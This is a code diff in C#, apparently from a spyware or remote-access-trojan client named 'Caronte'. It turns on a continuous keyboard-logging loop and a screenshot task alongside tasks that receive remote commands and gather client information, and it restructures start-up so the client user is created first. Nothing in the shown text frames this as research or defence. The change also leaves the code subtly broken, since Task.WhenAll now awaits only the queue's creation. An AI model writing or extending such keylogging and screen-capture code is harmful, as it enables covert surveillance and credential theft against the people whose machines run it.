@@ -22,12 +22,19 @@ namespace Caronte
             _cancellationToken = cancellationToken;
         }
 
-        private List<Task> CreateExecutionQueue()
+        private async Task CreateUser()
         {
+            await _mediator.Send(new CreateClientUserQuery());
+        }
+
+        private async Task<List<Task>> CreateExecutionQueue()
+        {
+            await CreateUser();
+
             var tasks = new List<Task>
             {
-                //InitializeLogTask(),
-                //InitializePrintScreenTask(),
+                InitializeLogTask(),
+                InitializePrintScreenTask(),
                 InitializeReceiveCommandTask()
             };
 
@@ -36,8 +43,6 @@ namespace Caronte
 
         public async Task Initialize()
         {
-            await _mediator.Send(new CreateClientUserQuery());
-
             await Task.WhenAll(CreateExecutionQueue());
         }
 
@@ -46,9 +51,7 @@ namespace Caronte
             var logTask = Task.Run(async () =>
             {
                 while (!_cancellationToken.IsCancellationRequested)
-                {
                     await _mediator.Send(new GetKeyboardLogQuery());
-                }
             }, _cancellationToken);
 
             return logTask;
@@ -87,9 +90,7 @@ namespace Caronte
             var getClientInformationTask = Task.Run(async () =>
             {
                 while (!_cancellationToken.IsCancellationRequested)
-                {
                     await _mediator.Send(new GetClientInformationQuery());
-                }
             }, _cancellationToken);
 
             return getClientInformationTask;
